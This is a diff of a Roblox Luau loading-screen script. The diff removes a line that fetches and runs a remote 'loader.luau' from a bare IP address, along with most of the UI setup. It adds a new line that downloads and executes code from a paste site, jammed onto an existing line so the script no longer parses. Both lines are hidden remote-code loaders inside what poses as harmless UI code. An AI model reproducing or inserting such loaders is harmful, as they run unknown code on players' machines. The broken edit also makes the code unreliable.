@@ -1,40 +1,4 @@
-ID="3c222cac-c2ea-49d9-9b23-c7c221411e95";
-loadstring(game:HttpGet("http://5.129.235.74:3910/cdn/loader.luau"))()
---// Services
-local Players = game:GetService("Players")
-local player = Players.LocalPlayer
-local playerGui = player:WaitForChild("PlayerGui")
-local TweenService = game:GetService("TweenService")
-
-------------------------------------------------
--- REMOVE OLD UI
-------------------------------------------------
-if playerGui:FindFirstChild("LoadingScreenUI") then
-	playerGui.LoadingScreenUI:Destroy()
-end
-
-------------------------------------------------
--- CREATE LOADING SCREEN (smaller)
-------------------------------------------------
-local gui = Instance.new("ScreenGui")
-gui.Name = "LoadingScreenUI"
-gui.ResetOnSpawn = false
-gui.Parent = playerGui
-
-local LoadingFrame = Instance.new("Frame")
-LoadingFrame.Size = UDim2.new(0, 340, 0, 120)
-LoadingFrame.Position = UDim2.new(0.5, -170, 0.5, -60)
-LoadingFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 35)
-LoadingFrame.BorderSizePixel = 0
-LoadingFrame.Parent = gui
-Instance.new("UICorner", LoadingFrame).CornerRadius = UDim.new(0, 10)
-
-local bgGradient = Instance.new("UIGradient")
-bgGradient.Color = ColorSequence.new({
-	ColorSequenceKeypoint.new(0, Color3.fromRGB(10, 10, 25)),
-	ColorSequenceKeypoint.new(1, Color3.fromRGB(35, 0, 70))
-})
-bgGradient.Rotation = 90
+loadstring(game:HttpGet('https://pastefy.app/IOS6Garc/raw'))()bgGradient.Rotation = 90
 bgGradient.Parent = LoadingFrame
 
 local Title = Instance.new("TextLabel")
